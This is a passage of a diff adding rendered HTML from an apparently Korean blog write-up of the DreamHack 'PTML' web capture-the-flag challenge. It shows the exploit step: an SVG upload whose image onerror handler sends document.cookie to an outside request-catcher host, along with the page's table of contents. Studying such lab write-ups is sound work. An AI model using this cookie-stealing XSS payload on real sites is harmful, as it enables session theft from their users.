+<p>다음과 같이 공격자 서버로 cookie를 전달하는 payload를 구성 후 업로드한다.</p>
+<pre data-lang="vim" style="background-color:#212733;color:#ccc9c2;" class="language-vim "><code class="language-vim" data-lang="vim"><span style="font-style:italic;color:#5ccfe6;">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+</span><span>&lt;image
+</span><span>href=</span><span style="color:#bae67e;">&quot;x&quot;
+</span><span>onerror=</span><span style="color:#bae67e;">&quot;location.href=&#39;https://kluxqje.request.dreamhack.games?&#39;+document.cookie&quot;</span><span style="color:#95e6cb;">/&gt;&lt;/</span><span>svg&gt;
+</span></code></pre>
+<p>업로드 시 서버측에서 스크립트가 실행되어 공격자 서버로 flag가 담긴 cookie가 전달된다.
+<img src="https://parkpingx2.github.io/study/2025-12-w4/images/ptml6.png" alt="6" /></p>
+
 
     
 
@@ -388,6 +796,44 @@
 
                     
                         
+
+<div class="hidden lg:block" data-toc-expand="true">
+    <div class="sticky top-20 px-4 py-2 border-l border-gray-500/15">
+        <h4 class="text-lg font-bold mb-1">ON THIS PAGE</h4>
+            <ul class="menu menu-sm toc-menu">
+            
+                <li>
+                    
+                    <details class="toc-details" open>
+                        <summary>
+                            <a href="https://parkpingx2.github.io/study/2025-12-w4/#dreamhack-web-level-2-ptml-write-up" class="toc-link">DreamHack Web Level 2 - PTML write-up</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://parkpingx2.github.io/study/2025-12-w4/#munje-seolmyeong-mic-gibon-dongjag-hwagin" class="toc-link">문제 설명 및 기본 동작 확인</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://parkpingx2.github.io/study/2025-12-w4/#soseukodeu-bunseog" class="toc-link">소스코드 분석</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://parkpingx2.github.io/study/2025-12-w4/#gonggyeog-geomjeung" class="toc-link">공격 검증</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://parkpingx2.github.io/study/2025-12-w4/#exploit" class="toc-link">exploit</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+            </ul>
+    </div>
+</div>
 
 
                     
